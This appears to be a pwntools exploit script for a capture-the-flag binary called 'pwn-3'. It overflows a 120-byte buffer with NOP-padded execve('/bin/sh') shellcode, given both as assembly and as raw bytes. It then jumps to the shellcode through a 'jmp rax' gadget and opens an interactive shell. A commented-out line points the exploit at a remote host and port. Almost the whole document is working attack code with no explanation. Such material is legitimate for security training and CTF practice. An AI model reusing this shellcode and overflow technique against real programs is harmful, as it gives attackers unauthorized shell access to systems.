from pwn import * 
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './pwn-3'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

def sla(payload):
    sh.sendlineafter(b'>>', b'2')
    sh.sendlineafter(b':', payload)

# sh = remote('103.127.96.241', 25204)
sh = process(exe)

padding = 120
rop = ROP(elf)

# gadget_jmp_rax = rop.find_gadget(['jmp rax']).address
gadget_jmp_rax = 0x000000000040111c
log.success(f'JMP RAX --> {hex(gadget_jmp_rax)}')

# gadget_call_rax = rop.find_gadget(['call rax'])[0]
gadget_call_rax = 0x0000000000401010
log.success(f'CALL RAX --> {hex(gadget_call_rax)}')

shell = """
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
"""

# p = flat([
#     asm(shell).ljust(padding, asm('nop')),
#     gadget_call_rax
# ])
# shl = asm(shell)
shl = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

p = flat([
    shl.ljust(padding, asm('nop')),
    gadget_jmp_rax
])

sla(p)
sh.interactive()